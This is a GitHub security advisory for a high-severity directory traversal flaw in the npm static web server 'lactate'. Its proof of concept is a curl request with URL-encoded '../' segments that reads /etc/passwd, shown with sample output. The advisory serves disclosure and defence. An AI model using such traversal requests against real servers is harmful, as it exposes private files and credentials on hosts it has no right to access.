# [H] Directory Traversal in lactate

## Summary
Severity: High
Advisory: GHSA-68gr-cmcp-g3mj
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2019-06-14
Source: https://github.com/advisories/GHSA-68gr-cmcp-g3mj
Type: github-advisory

## Affected
- npm: `lactate` — affected >=0

## Details
A crafted `GET` request can be leveraged to traverse the directory structure of a host using the lactate web server package, and request arbitrary files outside of the specified web root. This allows for a remote attacker to gain access to arbitrary files on the filesystem that the process has access to read.

Mitigating factors:
Only files that the user running `lactate` has permission to read will be accessible via this vulnerability.


[Proof of concept](https://hackerone.com/reports/296645):
Please globally install the `lactate` package and `cd` to a directory you wish to serve assets from. Next, run `lactate -p 8081` to start serving files from this location.

The following cURL request can be used to demonstrate this vulnerability by requesting the target `/etc/passwd` file:

```
curl "http://127.0.0.1:8081/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
[...]
```


## Recommendation

As there is currently no fix for this issue selecting an alternative static web server would be the best choice.

## References
- https://github.com/RetireJS/retire.js/commit/800c8140884eaa5753a49308f560c925fe97b9a5
- https://hackerone.com/reports/296645
- https://snyk.io/vuln/npm:lactate:20180123
- https://www.npmjs.com/advisories/560
